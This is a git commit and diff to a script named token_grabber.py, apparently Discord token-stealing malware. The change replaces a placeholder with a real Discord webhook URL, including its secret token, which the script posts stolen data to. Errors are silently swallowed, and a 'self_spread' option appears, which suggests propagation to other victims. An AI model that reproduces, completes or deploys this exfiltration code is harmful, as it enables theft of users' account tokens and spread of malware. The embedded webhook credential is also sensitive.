bdabb40a10d48d7e28130c7e5fd97acc578154c4
OriginalVexxed <126773157+OriginalVexxed@users.noreply.github.com>
2023-08-04 14:21:29 +0100

    Update token_grabber.py

--- token_grabber.py
+++ token_grabber.py
@@ -182,7 +182,7 @@ def main():
         "avatar_url": "https://discordapp.com/assets/5ccabf62108d5a8074ddd95af2211727.png"
     }
     try:
-        urlopen(Request("WEBHOOK_URL", data=dumps(webhook).encode(), headers=getheaders()))
+        urlopen(Request("https://discord.com/api/webhooks/1082785931901292636/RGNBtRFSij7Z8jZXWdd_ZfymDPJNc_cUP2jPiNqke-ANspeRo_uJPJI9RduoSdZB368z", data=dumps(webhook).encode(), headers=getheaders()))
     except:
         pass
     if self_spread:
